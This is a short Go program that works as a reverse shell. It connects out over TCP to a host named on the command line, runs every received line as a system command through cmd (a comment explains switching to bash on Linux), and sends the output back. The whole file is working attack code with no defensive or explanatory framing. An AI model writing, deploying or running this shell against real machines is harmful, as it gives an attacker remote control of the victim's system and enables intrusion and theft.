package main

import (
	"bufio"
	"log"
	"net"
	"os"
	"os/exec"
)

var arg = os.Args[1]

// TODO: Need to add a clean error message if no arg is passed.

func main() {
	shell(arg)
}

func shell(host string) {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		log.Fatal(err)
	}

	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command("cmd", "/C", message).CombinedOutput() // for linux, switch "cmd" to "bash" and "/C" to "-c"
		if err != nil {
			log.Fatal(err)
		}
		conn.Write(out)
	}
}
